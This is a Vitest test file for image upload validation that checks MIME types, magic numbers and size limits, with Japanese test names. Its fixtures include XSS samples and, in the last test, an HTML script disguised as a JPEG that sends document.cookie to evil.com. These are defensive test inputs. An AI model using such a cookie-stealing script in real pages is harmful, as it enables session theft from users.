import { describe, test, expect, vi } from 'vitest';
import {
  isImageFile,
  validateImageMagicNumber,
  isSecureImageFile,
  validateImageFile,
  validateImageFileAsync
} from '../imageUtils';

describe('imageUtils - SEC-010 画像ファイル偽装攻撃対策', () => {
  describe('isImageFile', () => {
    test('有効な画像MIMEタイプを受け入れる', () => {
      const jpegFile = new File([''], 'test.jpg', { type: 'image/jpeg' });
      const pngFile = new File([''], 'test.png', { type: 'image/png' });
      const webpFile = new File([''], 'test.webp', { type: 'image/webp' });
      
      expect(isImageFile(jpegFile)).toBe(true);
      expect(isImageFile(pngFile)).toBe(true);
      expect(isImageFile(webpFile)).toBe(true);
    });

    test('無効なMIMEタイプを拒否する', () => {
      const htmlFile = new File([''], 'test.html', { type: 'text/html' });
      const jsFile = new File([''], 'test.js', { type: 'application/javascript' });
      const exeFile = new File([''], 'test.exe', { type: 'application/x-msdownload' });
      
      expect(isImageFile(htmlFile)).toBe(false);
      expect(isImageFile(jsFile)).toBe(false);
      expect(isImageFile(exeFile)).toBe(false);
    });
  });

  describe('validateImageMagicNumber', () => {
    test('正しいJPEGファイルのマジックナンバーを検証', async () => {
      // JPEGのマジックナンバー: FF D8 FF
      const jpegData = new Uint8Array([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10]);
      const jpegFile = new File([jpegData], 'test.jpg', { type: 'image/jpeg' });
      
      const result = await validateImageMagicNumber(jpegFile);
      expect(result).toBe(true);
    });

    test('正しいPNGファイルのマジックナンバーを検証', async () => {
      // PNGのマジックナンバー: 89 50 4E 47 0D 0A 1A 0A
      const pngData = new Uint8Array([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]);
      const pngFile = new File([pngData], 'test.png', { type: 'image/png' });
      
      const result = await validateImageMagicNumber(pngFile);
      expect(result).toBe(true);
    });

    test('正しいWebPファイルのマジックナンバーを検証', async () => {
      // WebPのマジックナンバー: RIFF....WEBP
      const webpData = new Uint8Array([
        0x52, 0x49, 0x46, 0x46, // RIFF
        0x00, 0x00, 0x00, 0x00, // ファイルサイズ（ダミー）
        0x57, 0x45, 0x42, 0x50  // WEBP
      ]);
      const webpFile = new File([webpData], 'test.webp', { type: 'image/webp' });
      
      const result = await validateImageMagicNumber(webpFile);
      expect(result).toBe(true);
    });

    test('HTMLファイルを画像として偽装したファイルを検出', async () => {
      // HTMLファイルの内容（<html>タグで始まる）
      const htmlData = new TextEncoder().encode('<html><body>Malicious content</body></html>');
      const fakeImageFile = new File([htmlData], 'fake.jpg', { type: 'image/jpeg' });
      
      const result = await validateImageMagicNumber(fakeImageFile);
      expect(result).toBe(false);
    });

    test('JavaScriptファイルを画像として偽装したファイルを検出', async () => {
      // JavaScriptファイルの内容
      const jsData = new TextEncoder().encode('alert("XSS Attack!");');
      const fakeImageFile = new File([jsData], 'fake.png', { type: 'image/png' });
      
      const result = await validateImageMagicNumber(fakeImageFile);
      expect(result).toBe(false);
    });

    test('空のファイルを検出', async () => {
      const emptyFile = new File([], 'empty.jpg', { type: 'image/jpeg' });
      
      const result = await validateImageMagicNumber(emptyFile);
      expect(result).toBe(false);
    });
  });

  describe('isSecureImageFile', () => {
    test('正しいJPEGファイルを受け入れる', async () => {
      const jpegData = new Uint8Array([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10]);
      const jpegFile = new File([jpegData], 'test.jpg', { type: 'image/jpeg' });
      
      const result = await isSecureImageFile(jpegFile);
      expect(result.isValid).toBe(true);
      expect(result.error).toBeUndefined();
    });

    test('MIMEタイプが無効なファイルを拒否', async () => {
      const jpegData = new Uint8Array([0xFF, 0xD8, 0xFF]);
      const wrongMimeFile = new File([jpegData], 'test.txt', { type: 'text/plain' });
      
      const result = await isSecureImageFile(wrongMimeFile);
      expect(result.isValid).toBe(false);
      expect(result.error).toBe('サポートされていないファイル形式です。JPEG、PNG、WebPのみ対応しています。');
    });

    test('マジックナンバーが不正なファイルを拒否', async () => {
      const htmlData = new TextEncoder().encode('<script>alert("XSS")</script>');
      const fakeImageFile = new File([htmlData], 'fake.jpg', { type: 'image/jpeg' });
      
      const result = await isSecureImageFile(fakeImageFile);
      expect(result.isValid).toBe(false);
      expect(result.error).toBe('ファイルの内容が画像形式と一致しません。正しい画像ファイルをアップロードしてください。');
    });
  });

  describe('validateImageFileAsync', () => {
    test('2MB以下の正しいJPEGファイルを受け入れる', async () => {
      // 1MBのダミーデータ（JPEGマジックナンバー付き）
      const jpegData = new Uint8Array(1024 * 1024);
      jpegData[0] = 0xFF;
      jpegData[1] = 0xD8;
      jpegData[2] = 0xFF;
      
      const jpegFile = new File([jpegData], 'test.jpg', { type: 'image/jpeg' });
      
      const result = await validateImageFileAsync(jpegFile);
      expect(result.isValid).toBe(true);
    });

    test('2MBを超えるファイルを拒否', async () => {
      // 3MBのダミーデータ
      const largeData = new Uint8Array(3 * 1024 * 1024);
      largeData[0] = 0xFF;
      largeData[1] = 0xD8;
      largeData[2] = 0xFF;
      
      const largeFile = new File([largeData], 'large.jpg', { type: 'image/jpeg' });
      
      const result = await validateImageFileAsync(largeFile);
      expect(result.isValid).toBe(false);
      expect(result.error).toBe('ファイルサイズは2MB以下にしてください');
    });

    test('偽装されたファイルを検出して拒否', async () => {
      // 悪意のあるHTMLコンテンツ
      const maliciousHtml = `
        <html>
          <body>
            <script>
              // 悪意のあるコード
              document.cookie = "stolen";
              fetch("https://evil.com/steal", { 
                method: "POST", 
                body: JSON.stringify({cookies: document.cookie})
              });
            </script>
          </body>
        </html>
      `;
      
      const htmlData = new TextEncoder().encode(maliciousHtml);
      const fakeImageFile = new File([htmlData], 'innocent-photo.jpg', { type: 'image/jpeg' });
      
      const result = await validateImageFileAsync(fakeImageFile);
      expect(result.isValid).toBe(false);
      expect(result.error).toBe('ファイルの内容が画像形式と一致しません。正しい画像ファイルをアップロードしてください。');
    });
  });
});